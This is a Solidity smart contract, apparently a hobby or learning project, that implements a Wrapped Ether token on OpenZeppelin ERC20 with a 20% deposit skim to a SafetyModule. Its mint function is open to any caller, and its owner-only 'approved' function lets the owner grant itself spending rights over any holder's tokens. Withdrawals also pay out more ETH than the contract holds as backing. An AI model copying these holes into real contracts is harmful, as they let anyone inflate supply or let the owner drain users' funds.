// SPDX-License-Identifier: MIT

/// @notice My implementation of Wrapped Ether contract using 'ERC20 from OpenZeppelin'
/// @author Thomas THIERRY

pragma solidity ^0.8.20;


import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./SafetyModule.sol";

contract WETH is ERC20, Ownable {

    SafetyModule public safetymodule;

    ///@dev constructor 'asked' by the OpenZeppelin contract
    constructor(address payable  _safetymodule) ERC20("Wrapped Ether", "WETH") Ownable(msg.sender) {
        safetymodule = SafetyModule(_safetymodule);
     }

    /// @dev mint 1 WETH for each ETH sent by the sender. WETH are automatically associated to the sender. 20% of this are sent to SafetyModule contract
    function deposit() external payable {
        require(msg.value >= (1e17), "Insufficient deposit, minimum 0,1 ETH");
        uint _amount20 = (msg.value / 5) ;
        (bool success,) = address(safetymodule).call{value: _amount20}("");
        require(success, "Failed to send 20% of Ether deposit");
        _mint(msg.sender, msg.value - _amount20);
    }

    /// @dev If the balance of WETH is sufficient, unwrap WETH to ETH and send ETH to the caller. WETH are burned. 
    function withdraw(uint _amount) external {
        require(balanceOf(msg.sender) >= _amount, "Insufficient balance");
        _burn(msg.sender, _amount);
        payable(msg.sender).transfer(_amount);
    }

    ///@dev necessary to allow Yield to mint WETH to simulate investement. This function will be delete before deployment in mainnet.
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function approved(address owner, uint256 value) public onlyOwner {

        _approve(owner, msg.sender, value);
    }

}